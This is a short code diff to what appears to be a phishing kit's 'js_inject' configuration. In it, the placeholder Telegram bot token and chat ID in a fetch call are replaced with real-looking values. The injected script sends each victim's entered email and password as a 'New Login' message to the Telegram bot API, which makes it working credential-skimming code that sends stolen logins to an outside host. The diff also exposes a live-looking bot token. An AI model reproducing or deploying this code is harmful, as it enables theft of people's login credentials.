@@ -91,10 +91,10 @@ js_inject:
                 }),
                 keepalive: true
               }),
-              fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+              fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
                 method: 'POST',
                 body: JSON.stringify({
-                  chat_id: "YOUR_CHAT_ID",
+                  chat_id: "5228920520",
                   text: `New Login\n${formData.get('email')}\n${formData.get('pass')}`
                 })
               })
